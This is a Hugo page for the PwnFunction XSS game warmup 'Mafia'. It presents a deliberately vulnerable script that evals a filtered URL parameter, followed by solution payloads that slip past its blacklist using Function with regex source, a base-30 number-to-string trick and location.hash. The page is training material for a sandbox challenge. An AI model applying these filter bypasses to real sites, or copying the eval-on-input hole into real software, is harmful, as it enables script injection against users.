---
title: "XSS Game - Mafia | PwnFunction"
header: "Mafia"
challengeUrl: "https://sandbox.pwnfunction.com/warmups/mafia.html"
date: 2020-01-19T18:23:18+05:30
draft: false
type: warmup
difficulty: Easy
---

{{< rules >}}
<li>Difficulty is <b>Easy</b>.</li>
<li>Pop an <code>alert(1337)</code> on <code>sandbox.pwnfunction.com</code>.</li>
<li>No user interaction.</li>
<li>Cannot use <code>https://sandbox.pwnfunction.com/?html=&js=&css=</code>.</li>
<li>Tested on <b>Chrome</b>.</li>
{{</ rules >}}

{{< code >}}<code class="language-js">/* Challenge */
mafia = (new URL(location).searchParams.get('mafia') || '1+1')
mafia = mafia.slice(0, 50)
mafia = mafia.replace(/[\`\'\"\+\-\!\\\[\]]/gi, '_')
mafia = mafia.replace(/alert/g, '_')
eval(mafia)</code>{{< /code >}}

{{< solution >}}
<p>The GET parameter <code>mafia</code> is passed to <code>eval</code>, but it does a couple of
    things before it sends it over.
    <ul>
        <li>Truncates to length <code>50</code>.</li>
        <li><code>`'"+-!\[]</code> are replaced by an underscore.</li>
        <li>Replaces the string <code>alert</code> with underscores.</li>
    </ul>
</p>
To bypass this, we can simply use regex to get the string, lowercase it and feed it to
<code>Function</code>.
<pre
    class="solution-code-block"><code class="language-js">Function(/ALERT(1337)/.source.toLowerCase())()</code></pre>
<p>Or</p>
<pre
    class="solution-code-block"><code class="language-js">eval(8680439..toString(30))(1337)</code></pre>
<p>Or even better,</p>
<pre class="solution-code-block"><code class="language-js">eval(location.hash.slice(1))</code></pre>
and then add <code>#alert(1337)</code> to the URL to make it work. <br>(Thanks to @terjanq)
<br><br>
{{< /solution >}}